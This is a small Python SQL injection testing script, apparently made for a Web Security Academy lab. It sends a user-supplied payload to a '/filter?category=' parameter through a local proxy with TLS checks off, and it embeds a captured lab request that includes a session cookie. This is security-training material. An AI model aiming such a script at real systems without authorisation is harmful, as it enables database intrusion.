import requests
import urllib3
import sys

proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def exploit_sqli(url, payload):
    uri = "/filter?category="
    print ("Request: " + url + uri + payload)
    r = requests.get(url + uri+payload, verify=False, proxies=proxies)
    if ('Hydrated Crackers' in r.text):
        return True
    return False


x = '''
GET /filter?category=Gifts HTTP/1.1
Host: ac041fc81ef4a448c06253fc006900c0.web-security-academy.net
Cookie: session=oGGko5Mf5SO9CYikdAHgwWuJyudq03xC
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
'''  

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])   
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(100)

    if exploit_sqli(url, payload):
        print ("[+] SQLi Successful! :)")
    else:
        print ("[-] SQLi Unsuccessful :(")